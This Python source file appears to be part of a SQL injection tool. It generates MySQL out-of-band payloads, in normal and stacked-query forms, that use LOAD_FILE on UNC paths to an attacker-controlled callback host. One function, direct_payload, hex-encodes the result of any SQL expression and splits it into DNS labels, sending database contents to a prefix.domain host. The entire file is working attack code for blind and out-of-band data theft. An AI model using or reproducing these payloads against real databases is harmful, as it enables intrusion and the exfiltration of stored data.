def substring(name: str, expression: str, pos: int) -> str:
    return f"substr(({expression}),{pos},1)"


def payload(name: str, base: str, condition: str, callback_host: str) -> str:
    if name == "mysql":
        return (
            f"{base}' AND IF({condition},"
            f"LOAD_FILE('\\\\\\\\{callback_host}\\\\x'),0)-- "
        )
    if name == "mysql-stacked":
        escaped = callback_host.replace("'", "''")
        return (
            f"{base}'; SELECT IF({condition},"
            f"LOAD_FILE('\\\\\\\\{escaped}\\\\x'),NULL);--"
        )
    raise ValueError(f"unknown profile: {name}")


def payloads_full(name: str, base: str, condition: str, callback_host: str) -> list[str]:
    if name == "mysql":
        return list(dict.fromkeys([
            payload(name, base, condition, callback_host),
            (
                f"{base}' AND IF({condition},"
                f"LOAD_FILE('\\\\\\\\{callback_host}\\\\x'),0)#"
            ),
            (
                f"{base}' AND IF({condition},"
                f"LOAD_FILE(CONCAT('\\\\\\\\','{callback_host}','\\\\x')),0)-- -"
            ),
        ]))
    if name == "mysql-stacked":
        escaped = callback_host.replace("'", "''")
        return list(dict.fromkeys([
            payload(name, base, condition, callback_host),
            f"{base}'; SELECT IF({condition},LOAD_FILE('\\\\\\\\{escaped}\\\\x'),NULL)#",
        ]))
    raise ValueError(f"unknown profile: {name}")


def direct_payload(name: str, base: str, expression: str, prefix: str, domain: str) -> str | None:
    if name not in ("mysql", "mysql-stacked"):
        return None
    host = f"{prefix}.{domain}"
    h = f"HEX(({expression}))"
    split = (
        f"LEFT({h},62),"
        f"IF(LENGTH({h})>62,CONCAT('.',MID({h},63,62)),''),"
        f"IF(LENGTH({h})>124,CONCAT('.',MID({h},125,62)),''),"
        f"IF(LENGTH({h})>186,CONCAT('.',MID({h},187,62)),'')"
    )
    unc = f"CONCAT('\\\\\\\\\\\\\\\\',{split},'.{host}\\\\\\\\x')"
    if name == "mysql-stacked":
        return f"{base}'; SELECT LOAD_FILE({unc});-- -"
    return f"{base}' AND LOAD_FILE({unc})-- -"


def direct_payloads_full(
    name: str, base: str, expression: str, prefix: str, domain: str, payload: str
) -> list[str]:
    return [payload]
